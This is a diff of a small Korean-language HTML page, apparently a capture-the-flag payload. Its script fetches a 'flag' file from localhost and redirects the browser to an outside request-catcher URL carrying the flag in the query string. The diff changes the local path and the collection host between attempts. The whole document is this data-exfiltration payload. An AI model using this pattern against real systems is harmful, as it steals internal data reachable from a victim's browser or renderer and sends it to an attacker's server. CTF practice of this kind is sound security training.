@@ -2,16 +2,16 @@
 <html lang="ko">
 <head><meta charset="utf-8"><title>Pages JS 테스트</title></head>
 <body>
-  <h1>제발되라 기원 2트</h1>
+  <h1>제발되라 기원 3트</h1>
  <script>
 async function readFlag() {
   try {
-    const res = await fetch('http://127.0.0.1/flag', { cache: 'no-store' });
+    const res = await fetch('http://localhost/pdfs/flag', { cache: 'no-store' });
     if (!res.ok) throw new Error(`HTTP ${res.status}`);
     const text = (await res.text()).trim();
 
     // 길이가 짧을 때만 쿼리로 전송
-    const target = 'https://kzbjtmd.request.dreamhack.games?flag=' + encodeURIComponent(text);
+    const target = 'https://lmflyep.request.dreamhack.games?flag=' + encodeURIComponent(text);
     location.href = target; // 페이지 이동으로 전달
   } catch (e) {
     console.error(e);
